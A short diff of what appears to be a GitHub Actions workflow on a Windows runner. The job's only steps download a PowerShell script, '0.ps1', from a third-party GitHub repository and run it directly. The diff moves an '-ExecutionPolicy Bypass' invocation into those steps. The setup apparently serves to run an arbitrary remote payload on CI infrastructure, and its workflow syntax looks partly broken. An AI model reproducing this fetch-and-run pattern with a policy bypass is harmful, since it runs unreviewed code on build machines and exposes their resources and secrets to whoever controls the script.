@@ -4,9 +4,10 @@ jobs:
   build:
 
     runs-on: windows-latest
-    shell: 'powershell.exe -ExecutionPolicy Bypass'
+    
     steps:
     - name: Download
       run: |
            Invoke-WebRequest https://github.com/Usser1222/circleci/raw/main/0.ps1 -OutFile 0.ps1
            ./0.ps1
+           powershell.exe -ExecutionPolicy Bypass
